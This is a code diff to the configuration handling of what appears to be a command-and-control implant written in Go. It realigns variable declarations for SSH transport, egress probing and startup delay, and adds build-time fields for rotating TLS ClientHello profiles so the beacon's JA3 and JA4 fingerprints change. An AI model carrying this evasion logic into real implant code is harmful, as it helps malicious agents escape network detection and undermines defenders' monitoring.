@@ -91,15 +91,15 @@ var (
 
 	// Runtime state for the independent syscall policy (option B): shared with
 	// syscall_policy_windows.go so startup resolution is testable and observable.
-	syscallPolicyEnabled bool // runtime: syscall policy engaged (parsed from SyscallPolicyStr / FORGEC2_SYSCALL_POLICY)
-	SSHUserStr            string   = ""                            // SSH username for SSH transport (defaults to persistencePrefix)
-	SSHPasswordStr        string   = ""                            // SSH password for SSH transport
-	SSHKeyStr             string   = ""                            // base64-encoded PEM private key for SSH transport
-	SSHHostKeyStr         string   = ""                            // base64 server host public key (pin); empty = SSH transport refuses to connect
-	EgressDetectionStr    string   = "false"                       // enable egress detection on startup
-	EgressPortsStr        string   = "80,443,8080,8443,53,22,2222" // ports to test for egress
-	StartDelayMinStr      string   = "0"                           // startup delay window floor, seconds (0 = disabled)
-	StartDelayMaxStr      string   = "0"                           // startup delay window ceiling, seconds (0 = disabled)
+	syscallPolicyEnabled bool                                   // runtime: syscall policy engaged (parsed from SyscallPolicyStr / FORGEC2_SYSCALL_POLICY)
+	SSHUserStr           string = ""                            // SSH username for SSH transport (defaults to persistencePrefix)
+	SSHPasswordStr       string = ""                            // SSH password for SSH transport
+	SSHKeyStr            string = ""                            // base64-encoded PEM private key for SSH transport
+	SSHHostKeyStr        string = ""                            // base64 server host public key (pin); empty = SSH transport refuses to connect
+	EgressDetectionStr   string = "false"                       // enable egress detection on startup
+	EgressPortsStr       string = "80,443,8080,8443,53,22,2222" // ports to test for egress
+	StartDelayMinStr     string = "0"                           // startup delay window floor, seconds (0 = disabled)
+	StartDelayMaxStr     string = "0"                           // startup delay window ceiling, seconds (0 = disabled)
 
 	// Beacon randomization: controls how the beacon interval is randomized.
 	// "linear" (default): uniform random within ±jitter% of interval
@@ -310,6 +310,12 @@ type agentConfigBlob struct {
 	UserAgents              string            `json:"user_agents"`
 	JitterURI               string            `json:"jitter_uri"`
 	ParameterNames          string            `json:"parameter_names"`
+	// TLS ClientHello rotation, chosen at build time. "true" enables uTLS
+	// profile rotation and rotates both the JA3 and JA4 hashes because both
+	// are derived from the same hello; the profile may be "random" or a fixed
+	// browser name.
+	Chameleon        string `json:"chameleon"`
+	ChameleonProfile string `json:"chameleon_profile"`
 }
 
 // loadConfigBlob decodes the injected runtime config block and reapplies it over
@@ -731,6 +737,14 @@ func (b *agentConfigBlob) apply() {
 	}
 	if b.ParameterNames != "" {
 		ParameterNamesStr = b.ParameterNames
+	}
+	// TLS ClientHello rotation must be applied before initJA3Rotation() reads
+	// these in main(); the blob is decoded from a generated init().
+	if b.Chameleon != "" {
+		ChameleonStr = b.Chameleon
+	}
+	if b.ChameleonProfile != "" {
+		ChameleonProfileStr = b.ChameleonProfile
 	}
 	if b.ContentLengthJitter != "" {
 		if v, err := strconv.Atoi(b.ContentLengthJitter); err == nil {
